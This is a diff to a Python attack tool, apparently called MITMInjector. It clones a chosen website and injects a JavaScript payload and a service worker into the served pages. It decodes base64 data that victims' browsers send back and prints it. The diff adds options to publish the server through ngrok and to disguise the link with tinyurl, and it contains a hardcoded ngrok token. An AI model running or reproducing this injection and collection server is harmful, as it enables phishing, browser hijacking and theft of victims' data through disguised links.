@@ -70,7 +70,8 @@ class injectionHandler(BaseHTTPRequestHandler):
 				"script",				
 				type='application/javascript')
 			script.string=payloadFunctions + payload
-			html.body.insert(0, script)
+			#html.body.insert(0, script)
+			html.body.append(script)
 			return str(html).encode()
 
 	def end_headers (self):
@@ -83,7 +84,7 @@ class injectionHandler(BaseHTTPRequestHandler):
 			self.end_headers()
 			encPayload = str(self.path.split('/')[2])
 			decPayload = str(base64.b64decode(encPayload), "utf-8")
-			print ("RECEIVED PAYLOAD: " + decPayload)			
+			print ("RECEIVED PAYLOAD: \n" + decPayload)			
 			return
 
 		if self.path.startswith("/sw.js"):
@@ -92,6 +93,9 @@ class injectionHandler(BaseHTTPRequestHandler):
 			self.end_headers()
 			self.wfile.write(open("workers/" + self.worker + ".js",'r').read().encode())			
 			return
+
+		# Grabbing requeste headers
+		#print("Request from " + str(self.client_address) + ", User Agent: " + str(self.headers["User-Agent"]))
 
 		self.send_response(200)		
 		self.send_header('Content-type','text/html')
@@ -112,7 +116,7 @@ def startServer(url, port, payload, worker):
 		#Create a web server and define the handler to manage the incoming request
 		handler = partial(injectionHandler,payload, worker, url)
 		server = HTTPServer(('', port), handler)
-		print ('Started local server on port ' , port)
+		print ('Started local server on http://127.0.0.1:' + str(port))
 		server.serve_forever()
 
 	except KeyboardInterrupt:
@@ -136,17 +140,18 @@ def main(args):
 		
 
 	#start ngrok
-	lngrok = ngrok("yQaP2tUKuENSB2YttNqX_5KqoHDiGDbHzGAUDUXePj", str(args.port))
-	NgrokURL = lngrok.start()
-
-	print ("Public URL: " + NgrokURL)
-	print ("Short URL: " + urlShortener(NgrokURL))
+	if args.ngrok:
+		lngrok = ngrok("yQaP2tUKuENSB2YttNqX_5KqoHDiGDbHzGAUDUXePj", str(args.port))
+		NgrokURL = lngrok.start()
+		print ("Public URL: " + NgrokURL)
+		if (args.shortner):
+			print ("Short URL: " + urlShortener(NgrokURL))
 
 	startServer(args.url, args.port, args.payload, args.worker)
 
 if __name__ == '__main__':
 	version = "1.1.0"
-	print("""
+	print( """
  __  __ ___ _____ __  __ ___        _           _             
 |  \/  |_ _|_   _|  \/  |_ _|_ __  (_) ___  ___| |_ ___  _ __ 
 | |\/| || |  | | | |\/| || || '_ \ | |/ _ \/ __| __/ _ \| '__|
@@ -155,13 +160,17 @@ if __name__ == '__main__':
                                  |__/     
 
 	Andrea Fortuna - andrea@andreafortuna.org - https://www.andreafortuna.org
-	""")
+	""" )
 
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-u", "--url", required=True, help="Website to clone")
 	parser.add_argument("-p", "--port", required=False, help="Local server port (default:8080)", default=8080)
 	parser.add_argument("-P", "--payload", required=False, help="Payload")
-	parser.add_argument("-W", "--worker", required=False, help="Web worker")
+	parser.add_argument("-W", "--worker", required=False, help="Web worker [EXPERIMENTAL]")
+	parser.add_argument("-n", "--ngrok", required=False, action='store_true', help="Export server with ngrok.com")
+	parser.add_argument("-s", "--shortner", required=False, action='store_true', help="Mask ngrok.com url with tinyurl")
+	
+
 	args, leftovers = parser.parse_known_args()
 	main(args)
 
